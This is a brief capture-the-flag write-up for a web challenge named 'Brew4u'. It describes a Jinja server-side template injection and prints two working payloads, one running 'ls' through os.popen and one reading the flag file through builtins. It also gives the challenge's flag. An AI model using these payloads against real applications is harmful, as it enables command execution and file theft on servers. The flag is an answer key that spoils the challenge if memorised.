# Brew4u
![image](https://github.com/user-attachments/assets/235a5b0a-c874-4917-9bbc-cb546fdfc2ed)

# Solution
I don't have the image of this website either but it has an injection point in which you can inject SSTI and if you read below it's related to Jinja so this is a Jinja SSTI exploit. 
The commands I used were:
{{url_for.__globals__.os.__dict__.popen('ls').read()}} to find what is the name of the flag file then {{url_for.__globals__.__builtins__.open('flag_filename').read()}} to read the flag file which is HnH{j1njA2_t3mpl4t3_1nj3cT}.
